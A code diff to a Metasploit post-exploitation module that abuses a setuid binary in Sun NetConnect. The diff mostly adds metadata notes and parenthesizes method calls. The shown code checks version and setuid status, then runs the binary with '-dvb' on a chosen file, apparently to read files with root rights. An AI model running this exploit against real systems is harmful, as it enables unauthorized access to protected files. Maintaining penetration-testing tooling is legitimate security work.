@@ -34,7 +34,12 @@ class MetasploitModule < Msf::Post
           ['EDB', '30021'],
           ['BID', '23915']
         ],
-        'DisclosureDate' => '2007-05-07'
+        'DisclosureDate' => '2007-05-07',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
       )
     )
     register_options([
@@ -48,14 +53,14 @@ class MetasploitModule < Msf::Post
 
   def check
     if is_root?
-      fail_with Failure::BadConfig, 'Session already has root privileges'
+      fail_with(Failure::BadConfig, 'Session already has root privileges')
     end
 
     # This ls is based on the guidance in the sun alerts article
     unin = cmd_exec '/usr/bin/ls /opt/SUNWsrspx/bin/UninstallNetConnect.*.sh'
     unin =~ /UninstallNetConnect\.([\d.]{11})\.sh/
     unless ::Regexp.last_match(1)
-      print_error 'NetConnect uninstall not found, either not installed or too new'
+      print_error('NetConnect uninstall not found, either not installed or too new')
       return false
     end
 
@@ -64,10 +69,10 @@ class MetasploitModule < Msf::Post
       print_error "#{version} is not vulnerable"
       return false
     end
-    print_good "#{version} is vulnerable"
+    print_good("#{version} is vulnerable")
 
-    unless setuid? suid_bin_path
-      vprint_error "#{suid_bin_path} is not setuid, it must have been manually patched"
+    unless setuid?(suid_bin_path)
+      vprint_error("#{suid_bin_path} is not setuid, it must have been manually patched")
       return false
     end
 
@@ -76,10 +81,10 @@ class MetasploitModule < Msf::Post
 
   def run
     unless check
-      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')
     end
 
-    flag = Rex::Text.rand_text_alpha 5
+    flag = Rex::Text.rand_text_alpha(5)
     output = cmd_exec("#{suid_bin_path} -dvb #{datastore['FILE']} #{flag}")
     vprint_good("Raw Command Output: #{output}")
 
